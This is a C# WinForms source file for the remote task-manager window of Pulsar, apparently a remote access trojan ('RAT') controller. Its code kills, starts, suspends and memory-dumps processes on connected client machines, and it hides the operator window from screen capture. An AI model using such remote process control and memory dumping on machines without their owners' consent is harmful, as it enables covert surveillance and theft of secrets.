using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Models;
using Pulsar.Server.Controls;
using Pulsar.Server.Controls.Wpf;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmTaskManager : Form
    {
        /// <summary>
        /// The client which can be used for the task manager.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly TaskManagerHandler _taskManagerHandler;

        /// <summary>
        /// Holds the opened task manager form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new Dictionary<Client, FrmTaskManager>();

        private List<FrmMemoryDump> _memoryDumps = new List<FrmMemoryDump>();

        private int? _ratPid = null;

        private readonly ProcessTreeView _processTreeView;

        private Common.Models.Process[] _currentProcesses = Array.Empty<Common.Models.Process>();
        private ProcessTreeSortColumn _sortColumn = ProcessTreeSortColumn.Name;
        private bool _sortAscending = true;

        /// <summary>
        /// Creates a new task manager form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the task manager form.</param>
        /// <returns>
        /// Returns a new task manager form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmTaskManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmTaskManager f = new FrmTaskManager(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmTaskManager"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the task manager form.</param>
        public FrmTaskManager(Client client)
        {
            _connectClient = client;
            _taskManagerHandler = new TaskManagerHandler(client);
            _processTreeView = new ProcessTreeView();

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            _processTreeView.SortRequested += ProcessTreeView_SortRequested;
            _processTreeView.SelectedProcessChanged += ProcessTreeView_SelectedProcessChanged;
            processTreeHost.Child = _processTreeView;
        }

        /// <summary>
        /// Registers the task manager message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _taskManagerHandler.ProgressChanged += (s, processes) =>
            {
                Debug.WriteLine(_taskManagerHandler.LastProcessesResponse.RatPid);

                if (_taskManagerHandler.LastProcessesResponse != null)
                {
                    TasksChanged(s, processes, _taskManagerHandler.LastProcessesResponse.RatPid);

                }
                else
                {
                    TasksChanged(s, processes, null);
                }
            };
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            _taskManagerHandler.OnResponseReceived += CreateMemoryDump;
            MessageHandler.Register(_taskManagerHandler);
        }

        /// <summary>
        /// Unregisters the task manager message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_taskManagerHandler);
            _taskManagerHandler.OnResponseReceived -= CreateMemoryDump;
            _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            _taskManagerHandler.Dispose();

            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void TasksChanged(object sender, Common.Models.Process[] processes)
        {
            _currentProcesses = processes ?? Array.Empty<Common.Models.Process>();
            RenderProcesses();
        }

        private void TasksChanged(object sender, Common.Models.Process[] processes, int? ratPid)
        {
            _ratPid = ratPid;
            TasksChanged(sender, processes);
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            string text = string.Empty;
            switch (action)
            {
                case ProcessAction.Start:
                    text = result ? "Process started successfully" : "Failed to start process";
                    break;
                case ProcessAction.End:
                    text = result ? "Process ended successfully" : "Failed to end process";
                    break;
            }

            processesToolStripStatusLabel.Text = text;
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
            _taskManagerHandler.RefreshProcesses();
        }

        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var process in GetSelectedProcesses())
            {
                _taskManagerHandler.EndProcess(process.Id);
            }
        }

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string processName = string.Empty;
            if (InputBox.Show("Process name", "Enter Process name:", ref processName) == DialogResult.OK)
            {
                _taskManagerHandler.StartProcess(processName);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _taskManagerHandler.RefreshProcesses();
        }

        private void dumpMemoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var process in GetSelectedProcesses())
            {
                _taskManagerHandler.DumpProcess(process.Id);
            }
        }

        private void suspendProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var process in GetSelectedProcesses())
            {
                _taskManagerHandler.SuspendProcess(process.Id);
            }
        }

        public void CreateMemoryDump(object sender, DoProcessDumpResponse response)
        {
            if (response.Result == true)
            {
                this.Invoke((MethodInvoker)delegate
                {
                    FrmMemoryDump dumpFrm = FrmMemoryDump.CreateNewOrGetExisting(_connectClient, response);
                    _memoryDumps.Add(dumpFrm);
                    dumpFrm.Show();
                });
            }
            else
            {
                string reason = response.FailureReason == "" ? "" : $"Reason: {response.FailureReason}";
                MessageBox.Show($"Failed to dump process!\n{reason}", $"Failed to dump process ({response.Pid}) - {response.ProcessName}");
            }
        }

        private void ProcessTreeView_SortRequested(object sender, SortRequestedEventArgs e)
        {
            if (_sortColumn == e.Column)
            {
                _sortAscending = !_sortAscending;
            }
            else
            {
                _sortColumn = e.Column;
                _sortAscending = true;
            }

            RenderProcesses();
        }

        private void ProcessTreeView_SelectedProcessChanged(object sender, EventArgs e)
        {
            //TODO: Add details panel update
        }

        /// <summary>
        /// Rebuilds the WPF process tree hierarchy so parent and child processes stay grouped.
        /// </summary>
        private void RenderProcesses()
        {
            if (processTreeHost != null)
            {
                processTreeHost.Enabled = _taskManagerHandler != null;
            }

            _processTreeView.UpdateProcesses(_currentProcesses, _sortColumn, _sortAscending, _ratPid);

            var sortLabel = _sortColumn switch
            {
                ProcessTreeSortColumn.Pid => "PID",
                ProcessTreeSortColumn.WindowTitle => "Title",
                _ => "Name"
            };

            var orderLabel = _sortAscending ? "asc" : "desc";
            processesToolStripStatusLabel.Text = $"Processes: {_currentProcesses.Length} | Sort: {sortLabel} ({orderLabel})";
        }

        private IEnumerable<Common.Models.Process> GetSelectedProcesses()
        {
            return _processTreeView?.SelectedProcesses ?? Array.Empty<Common.Models.Process>();
        }


        private void topmostOnToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var process in GetSelectedProcesses())
            {
                _taskManagerHandler.SetTopMost(process.Id, true);
            }
        }

        private void topmostOffToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (var process in GetSelectedProcesses())
            {
                _taskManagerHandler.SetTopMost(process.Id, false);
            }
        }
    }
}
